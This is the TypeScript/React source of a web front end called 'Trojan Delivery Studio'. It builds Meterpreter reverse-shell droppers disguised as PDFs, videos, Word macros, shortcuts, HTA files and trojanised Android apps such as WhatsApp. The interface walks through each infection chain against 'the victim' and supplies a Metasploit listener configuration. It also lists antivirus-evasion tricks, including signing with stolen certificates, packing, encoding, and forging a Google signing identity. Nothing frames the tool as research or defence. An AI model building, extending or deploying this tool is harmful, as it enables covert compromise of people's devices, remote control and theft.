"use client";

/**
 * PAYLOAD EMBEDDING — Trojan Delivery Studio
 * Build convincing delivery vehicles for Meterpreter payloads
 */

import { useState, useCallback, useEffect } from "react";

type EmbedResult = {
  path?: string; filename?: string; size?: number; note?: string;
  instructions?: string[]; macro?: string; lnkName?: string;
  payloadGenerated?: boolean; deliveryUrl?: string;
};

const FORMATS = [
  { id: "pdf",    label: "PDF Document",      icon: "📄", ext: "pdf",  desc: "Adobe Reader JS exploit — opens clean document, silently downloads & runs payload" },
  { id: "video",  label: "Video Clip",         icon: "🎬", ext: "mp4",  desc: "MP4+ZIP polyglot — valid video + embedded payload extracted by archive tools" },
  { id: "office", label: "Word / Excel",       icon: "📊", ext: "docm", desc: "VBA AutoOpen macro — fires when victim opens document, no click required" },
  { id: "lnk",    label: "Shortcut (.LNK)",    icon: "🔗", ext: "lnk",  desc: "Windows shortcut with hidden PS payload — looks like PDF/folder icon" },
  { id: "hta",    label: "HTML Application",   icon: "🌐", ext: "hta",  desc: "HTA file via mshta.exe — double-click runs PowerShell, bypasses many AVs" },
  { id: "apk",    label: "Android APK",        icon: "🤖", ext: "apk",  desc: "Standalone Meterpreter APK or injected into legitimate app (WhatsApp, games)" },
];

const PAYLOADS = [
  { id: "windows/x64/meterpreter/reverse_tcp",  label: "Windows x64 Meterpreter",  os: "win" },
  { id: "windows/meterpreter/reverse_tcp",       label: "Windows x86 Meterpreter",  os: "win" },
  { id: "windows/x64/meterpreter/reverse_https", label: "Windows x64 HTTPS (TLS)",  os: "win" },
  { id: "android/meterpreter/reverse_tcp",       label: "Android Meterpreter",       os: "android" },
  { id: "linux/x64/meterpreter/reverse_tcp",     label: "Linux x64 Meterpreter",    os: "linux" },
  { id: "linux/x86/meterpreter/reverse_tcp",     label: "Linux x86 Meterpreter",    os: "linux" },
];

export default function EmbedPage() {
  const [format, setFormat] = useState("pdf");
  const [lhost, setLhost] = useState("192.168.1.100");
  const [lport, setLport] = useState("4444");
  const [payloadType, setPayloadType] = useState("windows/x64/meterpreter/reverse_tcp");
  const [decoyTitle, setDecoyTitle] = useState("Invoice_Q4_2026");
  const [templateApk, setTemplateApk] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<EmbedResult | null>(null);
  const [files, setFiles] = useState<Array<{ name: string; size: number; modified: string }>>([]);
  const [log, setLog] = useState<string[]>([]);

  const [copied, setCopied] = useState<string | null>(null);

  const addLog = (msg: string) =>
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 50));

  const loadFiles = useCallback(async () => {
    const r = await fetch("/api/embed");
    const d = await r.json() as { files: Array<{ name: string; size: number; modified: string }> };
    setFiles(d.files ?? []);
  }, []);

  // Trigger browser file download
  const downloadFile = useCallback((filename: string) => {
    const a = document.createElement("a");
    a.href = `/api/embed/download?file=${encodeURIComponent(filename)}`;
    a.download = filename;
    a.click();
    addLog(`↓ Downloading: ${filename}`);
  }, []);

  // Delete file from server
  const deleteFile = useCallback(async (filename: string) => {
    await fetch(`/api/embed/download?file=${encodeURIComponent(filename)}`, { method: "DELETE" });
    addLog(`🗑 Deleted: ${filename}`);
    loadFiles();
  }, [loadFiles]);

  // Copy text to clipboard
  const copyText = useCallback((text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 1800);
    addLog(`📋 Copied: ${label}`);
  }, []);

  const build = useCallback(async () => {
    setLoading(true); setResult(null);
    addLog(`Building ${format.toUpperCase()} dropper → ${lhost}:${lport}…`);
    const r = await fetch("/api/embed", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: format, lhost, lport: parseInt(lport),
        payload_type: payloadType, decoy_title: decoyTitle,
        template_apk: templateApk || undefined,
      }),
    });
    const d = await r.json() as { ok: boolean; data?: EmbedResult; error?: string };
    setLoading(false);
    if (d.ok && d.data) {
      setResult(d.data);
      addLog(`✓ Built: ${d.data.filename ?? "file"} (${d.data.size ? Math.round(d.data.size / 1024) + " KB" : "?"})`);
      loadFiles();
    } else {
      addLog(`✗ Error: ${d.error ?? "Unknown"}`);
    }
  }, [format, lhost, lport, payloadType, decoyTitle, templateApk, loadFiles]);

  // Load existing files on mount
  useEffect(() => { loadFiles(); }, [loadFiles]);

  const selectedFormat = FORMATS.find((f) => f.id === format)!;

  return (
    <div className="min-h-screen bg-[#030308] text-green-400 font-mono p-6">
      <div className="max-w-6xl mx-auto">

        {/* Header */}
        <div className="mb-6">
          <h1 className="text-[13px] tracking-[0.3em] text-green-400">PAYLOAD DELIVERY STUDIO</h1>
          <p className="text-[8px] text-green-900/50 mt-1">EMBED · TROJAN · DELIVER — PDF / VIDEO / OFFICE / LNK / HTA / APK</p>
        </div>

        <div className="grid grid-cols-[1fr_380px] gap-5">
          {/* LEFT: Builder */}
          <div className="space-y-4">

            {/* Format selector */}
            <div className="border border-green-900/20 rounded p-4">
              <div className="text-[8px] text-green-900 tracking-widest mb-3">SELECT DELIVERY FORMAT</div>
              <div className="grid grid-cols-3 gap-2">
                {FORMATS.map((f) => (
                  <button key={f.id} onClick={() => setFormat(f.id)}
                    className={`text-left p-3 border rounded transition-all ${
                      format === f.id
                        ? "border-green-700/60 bg-green-950/30"
                        : "border-green-900/15 hover:border-green-800/30"
                    }`}>
                    <div className="text-base mb-1">{f.icon}</div>
                    <div className={`text-[9px] font-semibold ${format === f.id ? "text-green-300" : "text-green-700"}`}>
                      {f.label}
                    </div>
                    <div className="text-[7px] text-green-900/40 mt-0.5 leading-relaxed">{f.desc}</div>
                  </button>
                ))}
              </div>
            </div>

            {/* Config */}
            <div className="border border-green-900/20 rounded p-4 grid grid-cols-2 gap-3">
              <div className="col-span-2">
                <div className="text-[8px] text-green-900 tracking-widest mb-3">PAYLOAD CONFIGURATION</div>
              </div>

              <div>
                <label className="block text-[8px] text-green-900/50 mb-1">Payload Type</label>
                <select value={payloadType} onChange={(e) => setPayloadType(e.target.value)}
                  className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700">
                  {PAYLOADS.map((p) => (
                    <option key={p.id} value={p.id}>{p.label}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-[8px] text-green-900/50 mb-1">Decoy File Name</label>
                <input value={decoyTitle} onChange={(e) => setDecoyTitle(e.target.value)}
                  className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
              </div>

              <div>
                <label className="block text-[8px] text-green-900/50 mb-1">LHOST (your IP / C2)</label>
                <input value={lhost} onChange={(e) => setLhost(e.target.value)}
                  className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
              </div>

              <div>
                <label className="block text-[8px] text-green-900/50 mb-1">LPORT (listener port)</label>
                <input value={lport} onChange={(e) => setLport(e.target.value)}
                  className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
              </div>

              {format === "apk" && (
                <div className="col-span-2">
                  <label className="block text-[8px] text-green-900/50 mb-1">
                    Template APK path (optional — for injecting into real app)
                  </label>
                  <input value={templateApk} onChange={(e) => setTemplateApk(e.target.value)}
                    placeholder="/path/to/whatsapp.apk"
                    className="w-full bg-black/30 border border-green-900/30 rounded px-2 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
                </div>
              )}
            </div>

            {/* How it works for selected format */}
            <div className="border border-green-900/10 rounded p-4">
              <div className="text-[8px] text-green-900/50 tracking-widest mb-2">
                HOW {selectedFormat.label.toUpperCase()} DROPPER WORKS
              </div>
              {format === "pdf" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① msfvenom generates reverse_tcp payload EXE</div>
                  <div>② PDF written with JavaScript /OpenAction + /Launch action</div>
                  <div>③ Adobe Reader executes JS on open → PowerShell downloads EXE to %TEMP%</div>
                  <div>④ EXE runs silently → Meterpreter connects back to your listener</div>
                  <div>⑤ Victim sees a legitimate-looking document — nothing suspicious</div>
                  <div className="text-yellow-900/60 mt-1">⚠ Requires Adobe Reader with JavaScript enabled (default on older versions)</div>
                </div>
              )}
              {format === "video" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① Valid MP4 container created (ftyp + mdat atoms)</div>
                  <div>② Meterpreter EXE appended as ZIP entry after MP4 data</div>
                  <div>③ Result: file plays as video AND extracts as ZIP archive</div>
                  <div>④ Victim opens video → nothing plays → told to install "codec"</div>
                  <div>⑤ Victim right-clicks → Open with 7-Zip → extracts codec_update.exe → runs it</div>
                  <div className="text-yellow-900/60 mt-1">Advanced: NTFS ADS stream hides payload inside filename.mp4:hidden.exe</div>
                </div>
              )}
              {format === "office" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① VBA macro generated with AutoOpen + Document_Open triggers</div>
                  <div>② Payload string split across variables to evade static AV detection</div>
                  <div>③ Macro downloads PS1 script from C2 and executes via IEX</div>
                  <div>④ PS1 fetches and runs Meterpreter shellcode in memory (no disk write)</div>
                  <div>⑤ Victim opens .docm → "Enable Macros" → full shell in seconds</div>
                  <div className="text-yellow-900/60 mt-1">Paste macro into Word VBA editor → Save As .docm</div>
                </div>
              )}
              {format === "lnk" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① .LNK shortcut created pointing to powershell.exe with hidden window</div>
                  <div>② Icon set to shell32.dll PDF/document icon — appears as normal file</div>
                  <div>③ Single click (not even double-click on some systems) fires PS</div>
                  <div>④ PS downloads and executes Meterpreter stager from C2</div>
                  <div>⑤ No .exe extension visible — AV often misses .lnk payloads</div>
                </div>
              )}
              {format === "hta" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① HTA (HTML Application) file created with VBScript launcher</div>
                  <div>② Window set to minimized + no taskbar — completely invisible</div>
                  <div>③ mshta.exe runs VBScript → PowerShell Base64 encoded command</div>
                  <div>④ PS loads Meterpreter assembly directly into memory via reflection</div>
                  <div>⑤ Bypasses many AVs that don't monitor mshta.exe execution chain</div>
                </div>
              )}
              {format === "apk" && (
                <div className="space-y-1 text-[8px] text-green-900/50">
                  <div>① msfvenom generates android/meterpreter/reverse_tcp APK</div>
                  <div>② Option A: Use standalone — renames to trusted app (System Update)</div>
                  <div>③ Option B: Inject into real APK — apktool decompile both</div>
                  <div>④ Payload smali classes copied into template app</div>
                  <div>⑤ MainActivity.smali patched to call payload on launch</div>
                  <div>⑥ Repackaged, signed with CN=Google Inc, victim installs normally</div>
                </div>
              )}
            </div>

            {/* Build button */}
            <button onClick={build} disabled={loading}
              className="w-full py-3 text-[10px] tracking-widest border border-red-700/50 text-red-400 rounded hover:bg-red-950/20 transition-all disabled:opacity-40 font-semibold">
              {loading ? `BUILDING ${selectedFormat.label.toUpperCase()} DROPPER…` : `▶ BUILD ${selectedFormat.label.toUpperCase()} DROPPER`}
            </button>

            {/* Result */}
            {result && (
              <div className="border border-green-700/40 rounded p-4 space-y-3 bg-green-950/5">
                <div className="flex items-center justify-between">
                  <div className="text-[9px] text-green-500 tracking-widest font-bold">✓ BUILD COMPLETE</div>
                  {result.filename && (
                    <button
                      onClick={() => downloadFile(result.filename!)}
                      className="flex items-center gap-2 rounded border border-green-600/60 bg-green-950/30 px-4 py-1.5 text-[9px] font-bold tracking-widest text-green-400 transition hover:bg-green-900/40">
                      ↓ DOWNLOAD {result.filename.split(".").pop()?.toUpperCase()}
                    </button>
                  )}
                </div>

                {result.filename && (
                  <div className="flex items-center gap-3 rounded border border-green-900/20 bg-black/30 px-3 py-2">
                    <span className="flex-1 font-mono text-[10px] text-green-300">{result.filename}</span>
                    {result.size && (
                      <span className="text-[8px] text-green-900/60">{(result.size / 1024).toFixed(1)} KB</span>
                    )}
                    <button
                      onClick={() => copyText(result.filename!, "filename")}
                      className="rounded border border-green-900/30 px-2 py-0.5 text-[8px] text-green-800 hover:text-green-500 transition">
                      {copied === "filename" ? "✓" : "Copy name"}
                    </button>
                  </div>
                )}

                {result.deliveryUrl && (
                  <div className="rounded border border-yellow-900/30 bg-black/30 px-3 py-2">
                    <div className="text-[7px] text-yellow-900/60 uppercase tracking-widest mb-1">Payload delivery URL</div>
                    <div className="flex items-center gap-2">
                      <code className="flex-1 text-[9px] text-yellow-400 break-all">{result.deliveryUrl}</code>
                      <button onClick={() => copyText(result.deliveryUrl!, "url")}
                        className="flex-shrink-0 rounded border border-yellow-900/30 px-2 py-0.5 text-[8px] text-yellow-800 hover:text-yellow-500 transition">
                        {copied === "url" ? "✓" : "Copy"}
                      </button>
                    </div>
                  </div>
                )}

                {result.note && (
                  <div className="rounded border border-green-900/20 bg-black/30 p-3">
                    <div className="mb-1 flex items-center justify-between">
                      <span className="text-[7px] uppercase tracking-widest text-green-900/50">Notes</span>
                      <button onClick={() => copyText(result.note!, "note")}
                        className="text-[8px] text-green-900/40 hover:text-green-600 transition">
                        {copied === "note" ? "✓ Copied" : "Copy"}
                      </button>
                    </div>
                    <pre className="whitespace-pre-wrap text-[8px] text-green-700">{result.note}</pre>
                  </div>
                )}

                {result.instructions && result.instructions.length > 0 && (
                  <div className="space-y-0.5">
                    <div className="text-[7px] uppercase tracking-widest text-green-900/50 mb-1">Instructions</div>
                    {result.instructions.map((step, i) => (
                      <div key={i} className="text-[8px] text-green-800 leading-relaxed">{step}</div>
                    ))}
                  </div>
                )}

                {result.macro && (
                  <div>
                    <div className="mb-1 flex items-center justify-between">
                      <span className="text-[7px] uppercase tracking-widest text-green-900/50">
                        VBA Macro — paste into Word / Excel VBA editor (Alt+F11)
                      </span>
                      <div className="flex gap-1.5">
                        <button onClick={() => copyText(result.macro!, "macro")}
                          className="rounded border border-green-700/40 bg-green-950/20 px-3 py-0.5 text-[8px] text-green-500 hover:bg-green-900/30 transition">
                          {copied === "macro" ? "✓ Copied!" : "📋 Copy Macro"}
                        </button>
                        <button onClick={() => {
                          const blob = new Blob([result.macro!], { type: "text/plain" });
                          const u = URL.createObjectURL(blob);
                          const a = document.createElement("a"); a.href = u; a.download = `${decoyTitle}.bas`; a.click(); URL.revokeObjectURL(u);
                          addLog("↓ Downloaded macro as .bas");
                        }}
                          className="rounded border border-green-800/30 px-2 py-0.5 text-[8px] text-green-700 hover:text-green-500 transition">
                          ↓ .bas
                        </button>
                      </div>
                    </div>
                    <pre className="max-h-40 overflow-y-auto rounded bg-black/40 p-3 text-[8px] text-green-600 leading-relaxed">
                      {result.macro}
                    </pre>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* RIGHT: files + log */}
          <div className="space-y-4">
            {/* Start listener reminder */}
            <div className="border border-yellow-900/20 rounded p-4">
              <div className="text-[8px] text-yellow-700 tracking-widest mb-2">START LISTENER BEFORE DELIVERY</div>
              <code className="block text-[8px] text-yellow-600 bg-black/30 rounded p-2 leading-relaxed">
                use exploit/multi/handler{"\n"}
                set PAYLOAD {payloadType}{"\n"}
                set LHOST 0.0.0.0{"\n"}
                set LPORT {lport}{"\n"}
                set ExitOnSession false{"\n"}
                run -j
              </code>
              <div className="text-[7px] text-yellow-900/40 mt-1">Run this in MSF console before sending the file</div>
            </div>

            {/* Generated files */}
            <div className="border border-green-900/15 rounded p-4">
              <div className="flex items-center justify-between mb-3">
                <div className="text-[8px] text-green-900 tracking-widest">
                  GENERATED FILES {files.length > 0 && `(${files.length})`}
                </div>
                <button onClick={loadFiles} className="text-[7px] text-green-900/50 hover:text-green-700 transition">↻ refresh</button>
              </div>
              {files.length === 0 ? (
                <div className="text-center py-5">
                  <p className="text-[8px] text-green-900/20">No files yet</p>
                  <p className="text-[7px] text-green-900/10 mt-0.5">Build a dropper above to generate</p>
                </div>
              ) : (
                <div className="space-y-1 max-h-64 overflow-y-auto pr-1">
                  {files.map((f) => {
                    const ext = f.name.split(".").pop()?.toUpperCase() ?? "BIN";
                    const extColors: Record<string, string> = {
                      PDF: "text-red-400 border-red-900/40",
                      DOCM: "text-blue-400 border-blue-900/40",
                      XLSM: "text-green-400 border-green-900/40",
                      APK: "text-lime-400 border-lime-900/40",
                      MP4: "text-purple-400 border-purple-900/40",
                      LNK: "text-amber-400 border-amber-900/40",
                      HTA: "text-orange-400 border-orange-900/40",
                      EXE: "text-red-500 border-red-900/40",
                      PS1: "text-cyan-400 border-cyan-900/40",
                      SH:  "text-green-400 border-green-900/40",
                    };
                    const badge = extColors[ext] ?? "text-slate-400 border-slate-700/40";
                    return (
                      <div key={f.name} className="group flex items-center gap-2 rounded border border-green-900/10 bg-black/10 px-2 py-1.5 transition hover:bg-black/20">
                        <span className={`flex-shrink-0 rounded border px-1 py-px font-mono text-[7px] font-bold ${badge}`}>{ext}</span>
                        <span className="flex-1 truncate font-mono text-[9px] text-green-600" title={f.name}>{f.name}</span>
                        <span className="flex-shrink-0 text-[7px] text-green-900/40">{(f.size / 1024).toFixed(1)}K</span>
                        <div className="flex flex-shrink-0 gap-1 opacity-0 transition group-hover:opacity-100">
                          <button
                            onClick={() => downloadFile(f.name)}
                            title="Download"
                            className="rounded border border-green-700/40 bg-green-950/20 px-2 py-0.5 text-[8px] text-green-500 hover:bg-green-900/40 transition">
                            ↓
                          </button>
                          <button
                            onClick={() => deleteFile(f.name)}
                            title="Delete"
                            className="rounded border border-red-900/40 px-2 py-0.5 text-[8px] text-red-800 hover:text-red-500 hover:border-red-700/40 transition">
                            ✕
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}

              {files.length > 0 && (
                <div className="mt-2 flex justify-between items-center border-t border-green-900/10 pt-2">
                  <span className="text-[7px] text-green-900/30">
                    {(files.reduce((a, f) => a + f.size, 0) / 1024).toFixed(1)} KB total
                  </span>
                  <button
                    onClick={async () => {
                      if (!confirm(`Delete all ${files.length} files?`)) return;
                      await Promise.all(files.map((f) => deleteFile(f.name)));
                    }}
                    className="text-[7px] text-red-900/40 hover:text-red-700 transition">
                    Clear all
                  </button>
                </div>
              )}
            </div>

            {/* AV evasion tips */}
            <div className="border border-green-900/10 rounded p-4">
              <div className="text-[8px] text-green-900/50 tracking-widest mb-2">AV EVASION TIPS</div>
              <div className="space-y-1.5">
                {[
                  { tip: "Sign payload", desc: "Use signtool.exe with stolen/self-signed cert — AV trusts signed binaries" },
                  { tip: "UPX pack", desc: "upx --brute payload.exe — changes PE hash, bypasses signature matching" },
                  { tip: "Shellcode encode", desc: "msfvenom -e x86/shikata_ga_nai -i 5 — polymorphic XOR encoder" },
                  { tip: "HTTPS payload", desc: "Use reverse_https — traffic looks like normal HTTPS browsing" },
                  { tip: "Staged payload", desc: "Stager is tiny (~200 bytes) — first stage downloads second stage in memory" },
                  { tip: "Custom icon", desc: "ResourceHacker.exe — change .exe icon to PDF/Word/zip icon" },
                ].map(({ tip, desc }) => (
                  <div key={tip} className="text-[7px]">
                    <span className="text-green-700">{tip}: </span>
                    <span className="text-green-900/40">{desc}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Build log */}
            <div className="border border-green-900/10 rounded p-3">
              <div className="text-[7px] text-green-900/30 tracking-widest mb-1">BUILD LOG</div>
              {log.map((l, i) => (
                <div key={i} className={`text-[8px] font-mono ${l.includes("✓") ? "text-green-600" : l.includes("✗") ? "text-red-600" : "text-green-900/40"}`}>
                  {l}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
